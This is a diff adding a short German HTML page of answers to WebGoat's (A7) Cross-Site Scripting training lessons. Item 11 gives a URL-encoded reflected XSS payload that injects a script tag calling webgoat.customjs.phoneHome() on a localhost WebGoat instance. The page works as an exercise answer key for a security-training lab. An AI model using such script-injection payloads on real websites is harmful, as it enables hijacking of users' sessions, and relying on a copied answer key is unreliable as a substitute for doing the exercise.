@@ -1,0 +1,10 @@
+<h1>Lösen Sie die Aufgaben in (A7) Cross-Site Scripting (XSS), Cross Site Scripting.</h1>
+
+<p>
+Nr. 2 yes <br>
+Nr. 10 start.mvc#test/ <br>
+Nr. 11 http://127.0.0.1:8080/WebGoat/start.mvc#test/%3Cscript%3Ewebgoat.customjs.phoneHome()%3C%2Fscript%3E <br>
+Nr. 12 4, 3, 1, 2, 4 <br>
+</p>
+
+<p>(Mit Hilfe der Lösungen gelöst)</p>
